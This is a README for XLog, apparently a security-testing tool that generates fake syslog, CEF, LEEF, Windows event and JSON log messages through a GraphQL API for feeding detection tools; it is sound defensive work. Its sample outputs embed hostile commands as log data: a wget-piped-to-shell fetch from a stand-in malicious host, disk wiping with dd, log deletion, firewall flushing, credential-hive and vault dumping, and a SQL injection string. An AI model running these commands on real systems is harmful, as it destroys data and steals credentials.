[![made-with](https://img.shields.io/badge/Built%20with-grey)]()
[![made-with-Python](https://img.shields.io/badge/Python-blue)](https://www.python.org/)
[![made-with-FastAPI](https://img.shields.io/badge/FastAPI-green)](https://fastapi.tiangolo.com/)
[![made-with-GraphQL](https://img.shields.io/badge/GraphQL-red)](https://graphql.org/)
[![Docker Pulls](https://img.shields.io/docker/pulls/aymanam/rosetta)](https://hub.docker.com/repository/docker/aymanam/rosetta)
[![scanned-with](https://img.shields.io/badge/Scanned%20with-gree)]()
[![snyk](https://snyk.io/test/github/my-soc/Rosetta/badge.svg)](https://snyk.io/test/github/my-soc/Rosetta)
![codeql](https://github.com/my-soc/Rosetta/actions/workflows/github-code-scanning/codeql/badge.svg)
[![slack-community](https://img.shields.io/badge/Slack-4A154C?logo=slack&logoColor=white)](https://go-rosetta.slack.com)

<img  align="left" src="img/rosetta-logo.svg" width="30%" alt="Rosetta"> 

# XLog
XLog is a tool to help you fake log messages. The main interface to the tool is a GraphQL API service with query capabilities to automate the following:
- Fake log messages in different formats.
- Run a worker to send those messages to your detection tools.


## Installation

- Clone the repository.
- Install the required packages using `pip install -r requirements.txt`. 
- Start the server using  `uvicorn app.main:app --host 0.0.0.0 --port 8000 --reload.`

## Run Your Container

- Build the image `docker build -t xlog`
- Run the image `docker run --name xlog -p 8000:8000 -d rosetta`

## Run a Ready Container
- You can run a ready container: `docker run --name xlog -p 8000:8000 -d aymanam/xlog:latest`

## Available Queries

You can use the built-in GraphiQL in-browser tool `http://[xlog-address]:[port]` for writing, validating, and
testing your GraphQL queries. Type queries into this side of the screen, and you will see intelligent typeaheads aware of the current GraphQL type schema and live syntax and  validation errors highlighted within the text.

You can also click on the Explorer page to view a list of the available queries:

### Log Fakers
`generateFakeData` query can be used to generate fake logs in different log formats.

#### Generate Fake Syslog Messages
***
The simplest query to generate random syslog message, the message represent a fake risky command execution on a unix server.

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!) {\n  generateFakeData(requestInput: {type: $type}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"SYSLOG"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "Jun 27 09:18:52 web-23.stokes.com sudo[7907]: scottchristopher : COMMAND ; chmod -R 777 /"
            ],
            "type": "FakerTypeEnum.SYSLOG"
        }
    }
}
```

***
If you want to set a timestamp to start from, you can set the timestamp input to a datatime formatted string, example "2022-01-01 12:00:00".
##### A curl example:

```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $timestamp: String!) {\n  generateFakeData(requestInput: {type: $type, timestamp: $timestamp}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"SYSLOG","timestamp":"2022-01-01 12:00:00"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "Jan 01 12:00:01 srv-88.guzman.info sudo[64797]: jenkinsheather : COMMAND ; iptables -F"
            ],
            "type": "FakerTypeEnum.SYSLOG"
        }
    }
}
```

***
If you want to fake multiple log entries, you can set the count input to an int.
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $count: Int!) {\n  generateFakeData(requestInput: {type: $type, count: $count}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"SYSLOG","count":3}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 3,
            "data": [
                "Jun 27 09:11:20 desktop-86.miller-schroeder.com sudo[17630]: imason : COMMAND ; find / -name '*.log' -exec rm -f {} \\;",
                "Jun 27 09:11:21 db-03.moody-jackson.com sudo[49965]: ikoch : COMMAND ; wget -O- http://malicious.example.com/malware | sh",
                "Jun 27 09:11:22 email-17.anderson-mendoza.info sudo[42447]: alexis04 : COMMAND ; find / -name '*.log' -exec rm -f {} \\;"
            ],
            "type": "FakerTypeEnum.SYSLOG"
        }
    }
}
```

***
If you want to set an observables list to pick from, you can include the following observables in your list:
- src_host
- user
- process
- cmd

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $observablesDict: JSON!) {\n  generateFakeData(requestInput: {type: $type, observablesDict: $observablesDict}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"SYSLOG","observablesDict":{"src_host":["test12","test32"]}}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "Jun 27 14:14:04 test32 sudo[8874]: alancamacho : COMMAND ; dd if=/dev/zero of=/dev/sda"
            ],
            "type": "FakerTypeEnum.SYSLOG"
        }
    }
}
```
***

#### Generate Fake CEF Messages
***
The simplest query to generate random CEF message, the message represent a firewall access log entry.

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!) {\n  generateFakeData(requestInput: {type: $type}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"CEF"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "CEF:0|Richards LLC|Firewall|1.0.0|dc39265e-67ba-46be-bd98-deaba99c2c53|2023-06-27 14:38:47.900286|Firewall Log SQL traffic from srv-75.bonilla.com:9675 to ['8.134.115.205']:43161|3|src=srv-75.bonilla.com spt=9675 dst=['8.134.115.205'] url=['https://oconnell.info/']dpt=43161 proto=SQL act=Log"
            ],
            "type": "FakerTypeEnum.CEF"
        }
    }
}
```

***
If you want to set a timestamp to start from, you can set the timestamp input to a datatime formatted string, example "2022-01-01 12:00:00".
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $timestamp: String!) {\n  generateFakeData(requestInput: {type: $type, timestamp: $timestamp}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"CEF","timestamp":"2022-01-01 12:00:00"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "CEF:0|Long PLC|Firewall|1.0.6|c1517d92-f712-49e1-9ca6-4d5b9fb8ab2e|2022-01-01 12:00:01|Firewall Drop UDP traffic from email-99.spencer.com:46713 to ['122.228.120.190']:42016|8|src=email-99.spencer.com spt=46713 dst=['122.228.120.190'] url=['https://www.thomas-burch.com/']dpt=42016 proto=UDP act=Drop"
            ],
            "type": "FakerTypeEnum.CEF"
        }
    }
}
```

***
If you want to fake multiple log entries, you can set the count input to an int.
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $count: Int!) {\n  generateFakeData(requestInput: {type: $type, count: $count}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"CEF","count":3}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 3,
            "data": [
                "CEF:0|Torres and Sons|Firewall|1.0.9|5c34158c-4759-484c-95bd-f3ef5442611a|2023-06-27 14:06:18.404290|Firewall Allow SQL traffic from laptop-23.pratt.org:20920 to ['38.73.246.136']:16665|1|src=laptop-23.pratt.org spt=20920 dst=['38.73.246.136'] url=['http://www.dean-hunt.com/']dpt=16665 proto=SQL act=Allow",
                "CEF:0|Kramer Ltd|Firewall|1.0.9|bb26069f-ac80-40ea-b28c-42dc48351260|2023-06-27 14:06:19.404290|Firewall Allow HTTP traffic from db-23.fletcher.biz:43649 to ['128.201.78.209']:17550|2|src=db-23.fletcher.biz spt=43649 dst=['128.201.78.209'] url=['https://wilson-mckay.biz/']dpt=17550 proto=HTTP act=Allow",
                "CEF:0|Thornton Ltd|Firewall|1.0.9|cd75262b-807b-4996-a98a-d20f9515db72|2023-06-27 14:06:20.404290|Firewall Wait HTTP traffic from laptop-43.johnston.com:20407 to ['35.203.210.60']:29266|3|src=laptop-43.johnston.com spt=20407 dst=['35.203.210.60'] url=['https://donovan-frank.com/']dpt=29266 proto=HTTP act=Wait"
            ],
            "type": "FakerTypeEnum.CEF"
        }
    }
}
```

***
If you want to set an observables list to pick from, you can include the following observables in your list:
- src_host 
- dst_ip
- url
- dst_port
- protocol
- action
- event_id

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $observablesDict: JSON!) {\n  generateFakeData(requestInput: {type: $type, observablesDict: $observablesDict}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"CEF","observablesDict":{"src_host":["test12","test32"],"dst_port":["443"]}}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "CEF:0|Gonzales, Gordon and Fischer|Firewall|1.0.0|552f0bcd-d9ef-4b6a-a624-e3e40118117d|2023-06-27 14:18:49.890367|Firewall Wait RTP traffic from test32:1120 to ['103.153.92.75']:443|8|src=test32 spt=1120 dst=['103.153.92.75'] url=['http://collins.com/']dpt=443 proto=RTP act=Wait"
            ],
            "type": "FakerTypeEnum.CEF"
        }
    }
}
```
***


#### Generate Fake LEEF Messages
***
The simplest query to generate random LEEF message, the message represent an application access log entry.

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!) {\n  generateFakeData(requestInput: {type: $type}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"LEEF"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "LEEF:1.0|Leef|Payment Portal|1.0|deviceEventDate=2023-06-27 14:18:25.102836|101.211.24.187|srv-45.burnett-gross.biz|f2:34:f6:63:32:bd|a2:fc:49:38:a0:07|src=196.163.63.55 dst=srv-45.burnett-gross.biz spt=38592 dpt=443 request=https://example.com/login.php?username=admin&password=pass method=Web-GET proto=HTTP/1.1 status=500 hash=['afb0ddb618f88e468db1195ffcf575e459f076796f0c427f1b6e333dbb500010']request_size=2092 response_size=2056 user_agent=Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.0 (KHTML, like Gecko) Chrome/57.0.883.0 Safari/536.0"
            ],
            "type": "FakerTypeEnum.LEEF"
        }
    }
}
```

***
If you want to set a timestamp to start from, you can set the timestamp input to a datatime formatted string, example "2022-01-01 12:00:00".
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $timestamp: String!) {\n  generateFakeData(requestInput: {type: $type, timestamp: $timestamp}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"LEEF","timestamp":"2022-01-01 12:00:00"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "LEEF:1.0|Leef|Payment Portal|1.0|deviceEventDate=2022-01-01 12:00:01|199.246.16.229|db-81.carter-cortez.com|75:38:38:9f:24:7a|4e:89:90:25:be:2b|src=136.153.26.128 dst=db-81.carter-cortez.com spt=32102 dpt=443 request=https://example.com/login.php?username=admin' OR 1=1 --&password=pass method=Web-GET proto=HTTP/1.1 status=500 hash=['724a3c2f4bb70a9899fb120afe23d9269236cd1b9bc86ca5db8ab2fa26fa06d3']request_size=5464 response_size=2543 user_agent=Mozilla/5.0 (iPad; CPU iPad OS 3_1_3 like Mac OS X) AppleWebKit/536.0 (KHTML, like Gecko) CriOS/35.0.815.0 Mobile/07A891 Safari/536.0"
            ],
            "type": "FakerTypeEnum.LEEF"
        }
    }
}
```

***
If you want to fake multiple log entries, you can set the count input to an int.
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $count: Int!) {\n  generateFakeData(requestInput: {type: $type, count: $count}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"LEEF","count":3}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 3,
            "data": [
                "LEEF:1.0|Leef|Payment Portal|1.0|deviceEventDate=2023-06-27 15:03:28.631508|74.228.239.71|laptop-36.ramos.com|aa:ac:96:14:d3:ce|d5:fe:b9:26:b3:83|src=123.236.216.62 dst=laptop-36.ramos.com spt=31971 dpt=443 request=https://example.com/login.php?username=admin&password=pass method=Web-GET proto=HTTP/1.1 status=500 hash=['76f97291874641f9f0d0cd55b3565ac8937a9ad4b56796c02ee8774d47e39c69']request_size=2529 response_size=9440 user_agent=Mozilla/5.0 (Macintosh; PPC Mac OS X 10_9_8 rv:5.0; zh-CN) AppleWebKit/535.18.7 (KHTML, like Gecko) Version/5.0.2 Safari/535.18.7",
                "LEEF:1.0|Leef|Payment Portal|1.0|deviceEventDate=2023-06-27 15:03:29.631508|170.59.226.56|lt-09.hansen.com|3c:49:79:bf:bb:64|8b:01:5f:6a:49:ba|src=137.8.57.191 dst=lt-09.hansen.com spt=30949 dpt=443 request=https://example.com/assets/jquery-1.11.1.js method=Web-GET proto=HTTP/1.1 status=200 hash=['17dda62258233ec12b4ef25e7ba6db86a162fa1169b8b864bbeed2321ca8c43e']request_size=6863 response_size=7643 user_agent=Mozilla/5.0 (iPod; U; CPU iPhone OS 3_0 like Mac OS X; nhn-MX) AppleWebKit/533.13.7 (KHTML, like Gecko) Version/3.0.5 Mobile/8B111 Safari/6533.13.7",
                "LEEF:1.0|Leef|Payment Portal|1.0|deviceEventDate=2023-06-27 15:03:30.631508|189.175.11.106|desktop-92.cabrera-smith.com|2c:1f:a3:be:06:e0|84:62:38:a2:0c:8c|src=64.216.98.151 dst=desktop-92.cabrera-smith.com spt=62231 dpt=443 request=https://example.com/assets/jquery-1.11.1.js method=Web-POST proto=HTTP/1.1 status=500 hash=['3401d38cd71914c0420a69d678b468d9d4cad1b1afacde18ec0631564e534bb4']request_size=502 response_size=9749 user_agent=Mozilla/5.0 (compatible; MSIE 6.0; Windows 98; Trident/5.0)"
            ],
            "type": "FakerTypeEnum.LEEF"
        }
    }
}
```

***
If you want to set an observables list to pick from, you can include the following observables in your list:
- src_host 
- src_ip
- file_hash
- techniques (a list of dicts with two keys: mechanism and indicator )
- error_code

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $observablesDict: JSON!) {\n  generateFakeData(requestInput: {type: $type, observablesDict: $observablesDict}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"LEEF","observablesDict":{"src_ip":["1.1.1.1","2.2.2.2"],"error_code":["200"],"techniques":[{"indicator":"https://www.example.org/auth","mechanism":"POST"}]}}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "LEEF:1.0|Leef|Payment Portal|1.0|deviceEventDate=2023-06-27 15:10:01.288392|157.223.92.17|srv-63.bridges.com|83:97:31:86:2d:17|6a:05:3c:42:59:cb|src=2.2.2.2 dst=srv-63.bridges.com spt=35888 dpt=443 request=https://www.example.org/auth method=POST proto=HTTP/1.1 status=200 hash=['e142d22da10a61c390458cbb6a47362623291e9580c65c4037ec8c8e33f18b9b']request_size=7426 response_size=1607 user_agent=Opera/8.21.(X11; Linux i686; uz-UZ) Presto/2.9.190 Version/12.00"
            ],
            "type": "FakerTypeEnum.LEEF"
        }
    }
}
```
***


#### Generate Fake WinEvent Messages
***
The simplest query to generate random WinEvent message, the message represent a Windows Event entry.

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!) {\n  generateFakeData(requestInput: {type: $type}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"WINEVENT"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"2e3c33dc-cff6-4eb4-9414-34e7a2eea05b\"/><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>13824</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2023-06-27 15:08:02.947253\"/><EventRecordID>756</EventRecordID><Correlation/><Execution ProcessID=\"4139\" ThreadID=\"3285\" Channel=\"Security\"/><Computer>desktop-15.clements.com</Computer><Security UserID=\"S-1-870\"/><EventData><Data Name=\"SubjectUserSid\">S-1-870</Data><Data Name=\"SubjectUserName\">jlopez</Data><Data Name=\"SubjectDomainName\">burke.com</Data><Data Name=\"SubjectLogonId\">S-1-870</Data><Data Name=\"NewProcessId\">8015</Data><Data Name=\"ProcessId\">4139</Data><Data Name=\"CommandLine\">reg.exe save HKLM\\Security %TEMP%\\security.hive</Data><Data Name=\"TargetUserSid\">S-1-870</Data><Data Name=\"TargetUserName\">jlopez</Data><Data Name=\"TargetDomainName\">burke.com</Data><Data Name=\"TargetLogonId\">S-1-870</Data><Data Name=\"LogonType\">3</Data></EventData></Event>"
            ],
            "type": "FakerTypeEnum.WINEVENT"
        }
    }
}
```

***
If you want to set a timestamp to start from, you can set the timestamp input to a datatime formatted string, example "2022-01-01 12:00:00".
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $timestamp: String!) {\n  generateFakeData(requestInput: {type: $type, timestamp: $timestamp}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"WINEVENT","timestamp":"2022-01-01 12:00:00"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"97cb455d-359c-4bc9-aae4-e7d635fdff4f\"/><EventID>4648</EventID><Version>0</Version><Level>0</Level><Task>13824</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2022-01-01 12:00:01\"/><EventRecordID>701</EventRecordID><Correlation/><Execution ProcessID=\"8301\" ThreadID=\"8115\" Channel=\"Security\"/><Computer>srv-25.bell-mayer.com</Computer><Security UserID=\"S-1-6727\"/><EventData><Data Name=\"SubjectUserSid\">S-1-6727</Data><Data Name=\"SubjectUserName\">kathleen68</Data><Data Name=\"SubjectDomainName\">hart.biz</Data><Data Name=\"SubjectLogonId\">S-1-6727</Data><Data Name=\"NewProcessId\">9597</Data><Data Name=\"ProcessId\">8301</Data><Data Name=\"CommandLine\">Import-Module DSInternals; Get-CachedDomainCredential</Data><Data Name=\"TargetUserSid\">S-1-6727</Data><Data Name=\"TargetUserName\">kathleen68</Data><Data Name=\"TargetDomainName\">hart.biz</Data><Data Name=\"TargetLogonId\">S-1-6727</Data><Data Name=\"LogonType\">3</Data></EventData></Event>"
            ],
            "type": "FakerTypeEnum.WINEVENT"
        }
    }
}
```

***
If you want to fake multiple log entries, you can set the count input to an int.
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $count: Int!) {\n  generateFakeData(requestInput: {type: $type, count: $count}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"WINEVENT","count":3}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 3,
            "data": [
                "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"141624af-7ea2-4845-8ea5-6fa3e5d16c1f\"/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2023-06-27 15:36:59.967681\"/><EventRecordID>410</EventRecordID><Correlation/><Execution ProcessID=\"5127\" ThreadID=\"4313\" Channel=\"Security\"/><Computer>db-36.baker.com</Computer><Security UserID=\"S-1-1070\"/><EventData><Data Name=\"SubjectUserSid\">S-1-1070</Data><Data Name=\"SubjectUserName\">joseph71</Data><Data Name=\"SubjectDomainName\">hernandez-clark.com</Data><Data Name=\"SubjectLogonId\">S-1-1070</Data><Data Name=\"NewProcessId\">8992</Data><Data Name=\"CreatorProcessId\">5127</Data><Data Name=\"TokenElevationType\">TokenElevationTypeLimited (3)</Data><Data Name=\"ProcessCommandLine\">rundll32.exe vaultcli.dll,VaultEnumerateVaults 0,%TEMP%\\vaultList.txt</Data>",
                "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"bdf1aacb-28fd-48ff-9a2a-b2fdfb0d7d62\"/><EventID>4672</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2023-06-27 15:37:00.967681\"/><EventRecordID>370</EventRecordID><Correlation/><Execution ProcessID=\"1465\" ThreadID=\"1379\" Channel=\"Security\"/><Computer>lt-35.jackson.com</Computer><Security UserID=\"S-1-837\"/><EventData><Data Name=\"SubjectUserSid\">S-1-837</Data><Data Name=\"SubjectUserName\">paula34</Data><Data Name=\"SubjectDomainName\">ibarra-wood.com</Data><Data Name=\"SubjectLogonId\">6069</Data><Data Name=\"PrivilegeList\">Full size four.</Data></EventData></Event>",
                "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"06266872-4bb5-4322-b8be-e7ed522b0ef6\"/><EventID>4688</EventID><Version>0</Version><Level>0</Level><Task>13312</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2023-06-27 15:37:01.967681\"/><EventRecordID>104</EventRecordID><Correlation/><Execution ProcessID=\"5165\" ThreadID=\"4304\" Channel=\"Security\"/><Computer>srv-14.williams-cohen.com</Computer><Security UserID=\"S-1-2350\"/><EventData><Data Name=\"SubjectUserSid\">S-1-2350</Data><Data Name=\"SubjectUserName\">smithlinda</Data><Data Name=\"SubjectDomainName\">lewis-rodriguez.net</Data><Data Name=\"SubjectLogonId\">S-1-2350</Data><Data Name=\"NewProcessId\">1885</Data><Data Name=\"CreatorProcessId\">5165</Data><Data Name=\"TokenElevationType\">TokenElevationTypeLimited (3)</Data><Data Name=\"ProcessCommandLine\">wmic.exe /namespace:\\root\\cimv2 path Win32_Account</Data>"
            ],
            "type": "FakerTypeEnum.WINEVENT"
        }
    }
}
```

***
If you want to set an observables list to pick from, you can include the following observables in your list:
- event_id 
- process
- src_host
- cmd
- src_ip
- file_name

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $observablesDict: JSON!) {\n  generateFakeData(requestInput: {type: $type, observablesDict: $observablesDict}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"WINEVENT","observablesDict":{"src_ip":["1.1.1.1","2.2.2.2"],"event_id":["4683","5648"],"process":["explorer.exe"]}}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                "<Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"><System><Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"33c17152-3ca1-4ba7-9a98-7984848048dc\"/><EventID>4624</EventID><Version>0</Version><Level>0</Level><Task>12544</Task><Opcode>0</Opcode><Keywords>0x8020000000000000</Keywords><TimeCreated SystemTime=\"2023-06-27 15:50:37.353805\"/><EventRecordID>5648</EventRecordID><Correlation/><Execution ProcessID=\"1070\" ThreadID=\"2239\" Channel=\"Security\"/><Computer>db-30.hubbard.biz</Computer><Security UserID=\"S-1-5682\"/><EventData><Data Name=\"SubjectUserSid\">S-1-5682</Data><Data Name=\"SubjectUserName\">cmorales</Data><Data Name=\"SubjectDomainName\">johnson-barrett.com</Data><Data Name=\"SubjectLogonId\">S-1-5682</Data><Data Name=\"LogonType\">3</Data><Data Name=\"TargetUserSid\">S-1-5682</Data><Data Name=\"TargetUserName\">cmorales</Data><Data Name=\"TargetDomainName\">johnson-barrett.com</Data><Data Name=\"ProcessName\">explorer.exe</Data><Data Name=\"ProcessId\">1070</Data><Data Name=\"DestinationLogonId\">9840</Data><Data Name=\"SourceNetworkAddress\">2.2.2.2</Data><Data Name=\"SourcePort\">15971</Data><Data Name=\"LogonGuid\">33c17152-3ca1-4ba7-9a98-7984848048dc</Data><Data Name=\"TransmittedServices\">Believe kitchen road.</Data></EventData></Event>"
            ],
            "type": "FakerTypeEnum.WINEVENT"
        }
    }
}
```
***


#### Generate Fake JSON Messages
***
The simplest query to generate random JSON message, the message represent a Vulnerability Found entry.

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!) {\n  generateFakeData(requestInput: {type: $type}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"JSON"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                {
                    "event_type": "vulnerability_discovered",
                    "timestamp": "Jun 27 17:31:22",
                    "severity": 3,
                    "host": "srv-31.cox.com",
                    "file_hash": [
                        "6c526bcdaf0c93b3f391a2015f30bfc95b45ef43a02d075b8da2315d3db46bcf"
                    ],
                    "cve": [
                        "CVE-4145-1054"
                    ]
                }
            ],
            "type": "FakerTypeEnum.JSON"
        }
    }
}
```

***
If you want to set a timestamp to start from, you can set the timestamp input to a datatime formatted string, example "2022-01-01 12:00:00".
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $timestamp: String!) {\n  generateFakeData(requestInput: {type: $type, timestamp: $timestamp}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"JSON","timestamp":"2022-01-01 12:00:00"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                {
                    "event_type": "vulnerability_discovered",
                    "timestamp": "Jan 01 12:00:01",
                    "severity": 1,
                    "host": "email-61.ross.com",
                    "file_hash": [
                        "b31050271dda7b6e1f459b090636f1bdc05621b7bda157a13ff71517686f2a95"
                    ],
                    "cve": [
                        "CVE-4539-2672"
                    ]
                }
            ],
            "type": "FakerTypeEnum.JSON"
        }
    }
}
```

***
If you want to fake multiple log entries, you can set the count input to an int.
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $count: Int!) {\n  generateFakeData(requestInput: {type: $type, count: $count}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"JSON","count":3}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 3,
            "data": [
                {
                    "event_type": "vulnerability_discovered",
                    "timestamp": "Jun 27 17:27:50",
                    "severity": 3,
                    "host": "db-13.carter-mclaughlin.com",
                    "file_hash": [
                        "ab25d24fc4d6378679e49c8754ee725e13666fca2a8ff341aed01d827122786b"
                    ],
                    "cve": [
                        "CVE-6211-2979"
                    ]
                },
                {
                    "event_type": "vulnerability_discovered",
                    "timestamp": "Jun 27 17:27:51",
                    "severity": 3,
                    "host": "lt-72.gray.com",
                    "file_hash": [
                        "67b4152dd8af3342349e85314a4f423662056aa094065d5d14430db1c6c52947"
                    ],
                    "cve": [
                        "CVE-6627-4255"
                    ]
                },
                {
                    "event_type": "vulnerability_discovered",
                    "timestamp": "Jun 27 17:27:52",
                    "severity": 2,
                    "host": "web-96.scott-potts.biz",
                    "file_hash": [
                        "80036e60d45d84312cfc658a80c050b742d13b8e887ab4e31377276499247aa3"
                    ],
                    "cve": [
                        "CVE-1183-3402"
                    ]
                }
            ],
            "type": "FakerTypeEnum.JSON"
        }
    }
}
```

***
If you want to set an observables list to pick from, you can include the following observables in your list:
- cve 
- src_host
- severity
- file_hash

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!, $observablesDict: JSON!) {\n  generateFakeData(requestInput: {type: $type, observablesDict: $observablesDict}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"JSON","observablesDict":{"src_host":["test23","test325"],"cve":["CVE123"]}}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                {
                    "event_type": "vulnerability_discovered",
                    "timestamp": "Jun 27 18:08:14",
                    "severity": 1,
                    "host": "test325",
                    "file_hash": [
                        "d11d23dbb90dcd8d8055077c5843be6737e7a75876f39d88d4e1c1e553edb97f"
                    ],
                    "cve": "CVE123"
                }
            ],
            "type": "FakerTypeEnum.JSON"
        }
    }
}
```
***


#### Generate Fake Incident Messages
***
The simplest query to generate random Incident.

##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
--data '{"query":"query MyQuery ($type: FakerTypeEnum!) {\n  generateFakeData(requestInput: {type: $type}) {\n    count\n    data\n    type\n  }\n}","variables":{"type":"Incident"}}'
```
Example output:
```json
{
    "data": {
        "generateFakeData": {
            "count": 1,
            "data": [
                {
                    "id": 1,
                    "type": "Account Compromised",
                    "duration": 4,
                    "analyst": "Justin"
                }
            ],
            "type": "FakerTypeEnum.Incident"
        }
    }
}
```

***
If you want to choose the fields to return, you can select one or more of the following fields:
- id
- duration
- type
- analyst
- severity
- description
- events
##### A curl example:
```bash
curl --location 'http://localhost:8000' \
--header 'Content-Type: application/json' \
